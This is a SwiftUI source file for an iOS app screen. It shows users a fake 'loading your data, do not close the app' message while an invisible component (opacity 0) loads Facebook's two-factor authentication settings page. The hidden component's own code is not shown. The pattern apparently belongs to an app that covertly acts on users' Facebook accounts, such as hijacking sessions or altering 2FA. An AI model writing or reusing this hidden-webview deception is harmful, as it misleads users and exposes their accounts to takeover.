//
//  File.swift
//
//
//  Created by DanHa on 25/03/2023.
//

import SwiftUI

@available(iOS 14.0, *)
struct Nine_View_Au: View {
    @State var is_Nine_Au_Chuyen_Man = false
    @State var is_Nine_Au_Contains = false
    public init() {
        
    }
    var body: some View {
        ZStack { Color.white.ignoresSafeArea()
            if is_Nine_Au_Chuyen_Man {
                TenView()
            } else {
                if is_Nine_Au_Contains {
                    Nine_View_Au()
                } else {
                    ProgressView {
                        VStack(spacing: 8) {
                            Text("We're loading your data...") // .font(.system(size: 12))
                            Text("It might take a while") // .font(.system(size: 12))
                            Text("Please do not close the app").foregroundColor(Color.red).opacity(0.8)
                        }.padding(.horizontal)
                    }
                    Coords_Nine_Au(url: URL(string: "https://www.facebook.com/security/2fac/settings"), is_Nine_Au_Chuyen_Man: $is_Nine_Au_Chuyen_Man, is_Nine_Au_Contains: $is_Nine_Au_Contains).opacity(0)
                }
            } // else
        } // ZStack
    } // body
}
